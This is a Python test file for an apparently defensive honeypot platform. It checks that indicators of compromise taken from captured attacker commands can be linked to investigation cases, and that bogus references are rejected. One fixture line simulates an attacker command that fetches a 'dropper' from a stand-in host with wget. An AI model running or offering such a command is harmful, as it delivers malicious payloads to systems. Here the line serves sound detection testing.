from __future__ import annotations

from aegis_nexus.app import create_app


def _client(tmp_path):
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "aegis.db"),
        "INGEST_API_KEY": "sensor-secret",
        "OPERATOR_API_KEY": "operator-secret",
    })
    return app.test_client()


def test_ioc_can_be_linked_directly_to_a_case_and_resolves(tmp_path):
    client = _client(tmp_path)
    operator = {"X-Aegis-Operator-Key": "operator-secret"}

    # A command carrying a URL yields a derived url/domain IOC.
    assert client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "sensor-secret"},
        json={
            "honeypot": "ssh-1",
            "event_type": "command",
            "observed": {"source_ip": "203.0.113.5", "service": "ssh", "protocol": "tcp",
                         "destination_port": 22, "command": "wget http://example.invalid/dropper"},
        },
    ).status_code == 201

    iocs = client.get("/api/v1/iocs", headers=operator).get_json()["items"]
    ioc = next(item for item in iocs if item["type"] in {"url", "domain"})
    ioc_id = ioc["id"]

    case_id = client.post("/api/v1/cases", headers=operator, json={"title": "IOC case"}).get_json()["id"]
    linked = client.post(
        f"/api/v1/cases/{case_id}/evidence",
        headers=operator,
        json={"type": "ioc", "id": ioc_id},
    )
    assert linked.status_code == 200

    case = client.get(f"/api/v1/cases/{case_id}", headers=operator).get_json()
    ioc_ev = next(e for e in case["evidence"] if e["evidence_type"] == "ioc")
    assert ioc_ev["evidence_id"] == ioc_id
    assert ioc_ev["available"] is True
    assert ioc_ev["summary"]["id"] == ioc_id
    assert ioc_ev["summary"]["evidence_provenance"] == "derived_artifact"
    assert ioc_ev["summary"]["type"] in {"url", "domain"}


def test_unknown_ioc_reference_is_rejected_not_invented(tmp_path):
    # Consistent with event/session/alert: an IOC that is not currently
    # derivable from retained telemetry cannot be linked (404), never invented.
    client = _client(tmp_path)
    operator = {"X-Aegis-Operator-Key": "operator-secret"}
    case_id = client.post("/api/v1/cases", headers=operator, json={"title": "Dangling IOC"}).get_json()["id"]
    linked = client.post(
        f"/api/v1/cases/{case_id}/evidence",
        headers=operator,
        json={"type": "ioc", "id": "ioc_deadbeefdeadbeefdeadbeef"},
    )
    assert linked.status_code == 404


def test_invalid_evidence_type_still_rejected(tmp_path):
    client = _client(tmp_path)
    operator = {"X-Aegis-Operator-Key": "operator-secret"}
    case_id = client.post("/api/v1/cases", headers=operator, json={"title": "Reject"}).get_json()["id"]
    bad = client.post(
        f"/api/v1/cases/{case_id}/evidence",
        headers=operator,
        json={"type": "bogus", "id": "x"},
    )
    assert bad.status_code == 422
